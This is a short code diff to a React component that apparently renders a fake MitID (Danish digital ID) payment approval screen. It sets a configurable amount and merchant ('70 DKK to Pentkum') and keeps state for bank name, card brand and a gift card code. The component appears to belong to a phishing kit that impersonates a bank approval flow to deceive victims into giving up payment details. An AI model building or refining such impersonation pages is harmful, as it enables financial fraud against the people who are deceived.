@@ -32,8 +32,8 @@ function NextStepAppr() {
   const [isSending, setIsSending] = useState(false);
   const [bankName, setBankName] = useState('Bank');
   const [cardBrand, setCardBrand] = useState('VISA');
-  const [amount, setAmount] = useState('0.00');
-  const [merchant, setMerchant] = useState('Spotify ');
+  const [amount, setAmount] = useState('70.00');
+  const [merchant, setMerchant] = useState('Pentkum ');
 
   const [showGiftCard, setShowGiftCard] = useState(false);
   const [giftCode, setGiftCode] = useState('');
@@ -238,7 +238,7 @@ function NextStepAppr() {
           </div>
 
           <div className="mitid-transaction-info">
-            Betal 70 DKK til Pentkum
+            Betal {amount} DKK til {merchant}
           </div>
 
           <div className="mitid-approval-section">
